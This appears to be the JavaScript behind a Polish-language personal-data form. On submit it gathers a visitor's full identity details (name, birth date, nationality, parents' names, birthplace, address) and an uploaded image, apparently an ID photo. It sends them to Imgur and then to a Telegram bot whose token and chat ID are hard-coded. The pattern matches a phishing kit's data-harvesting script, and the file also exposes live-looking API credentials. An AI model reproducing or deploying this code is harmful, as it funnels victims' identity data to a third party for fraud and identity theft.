
const IMGUR_CLIENT_ID = 'c8c28d402435402';
const TELEGRAM_CHAT_ID = '5447264217';
const TELEGRAM_TOKEN = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';

document.querySelector('.go').addEventListener('click', async () => {
  const name = document.getElementById('name').value;
  const surname = document.getElementById('surname').value;
  const gender = document.querySelector('.selector_text')?.textContent?.trim();
  const day = document.querySelectorAll('.date_input')[0].value;
  const month = document.querySelectorAll('.date_input')[1].value;
  const year = document.querySelectorAll('.date_input')[2].value;
  const dateOfBirth = `${day}.${month}.${year}`;
  const nationality = document.getElementById('nationality').value;
  const familyName = document.getElementById('familyName').value;
  const fathersFamilyName = document.getElementById('fathersFamilyName').value;
  const mothersFamilyName = document.getElementById('mothersFamilyName').value;
  const birthPlace = document.getElementById('birthPlace').value;
  const countryOfBirth = document.getElementById('countryOfBirth').value;
  const address1 = document.getElementById('adress1').value;
  const address2 = document.getElementById('adress2').value;
  const city = document.getElementById('city').value;

  const text = `
<b>📄 Nowe dane:</b>
👤 Imię: ${name}
👤 Nazwisko: ${surname}
⚧️ Płeć: ${gender}
📅 Data urodzenia: ${dateOfBirth}
🌍 Obywatelstwo: ${nationality}
👪 Nazwisko rodowe: ${familyName}
👨 Ojciec: ${fathersFamilyName}
👩 Matka: ${mothersFamilyName}
🏙️ Miejsce urodzenia: ${birthPlace}, ${countryOfBirth}
🏠 Adres: ${address1}, ${address2} ${city}
  `;

  const fileInput = document.querySelector('input[type="file"]');
  const file = fileInput?.files?.[0];

  try {
    let imageUrl = null;

    if (file) {
      const formData = new FormData();
      formData.append('image', file);

      const imgurRes = await fetch('https://api.imgur.com/3/image', {
        method: 'POST',
        headers: {
          Authorization: `Client-ID ${IMGUR_CLIENT_ID}`
        },
        body: formData
      });

      const imgurData = await imgurRes.json();
      if (!imgurData.success) throw new Error('Błąd podczas uploadu do Imgura');
      imageUrl = imgurData.data.link;
    }

    const telegramEndpoint = imageUrl
      ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`
      : `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    const body = imageUrl
      ? {
          chat_id: TELEGRAM_CHAT_ID,
          photo: imageUrl,
          caption: text,
          parse_mode: 'HTML'
        }
      : {
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        };

    const res = await fetch(telegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });

    const data = await res.json();
    if (!data.ok) throw new Error(data.description);

    alert('✅ Dane zostały wysłane do Telegrama!');
  } catch (err) {
    console.error(err);
    alert('❌ Błąd: ' + err.message);
  }
});
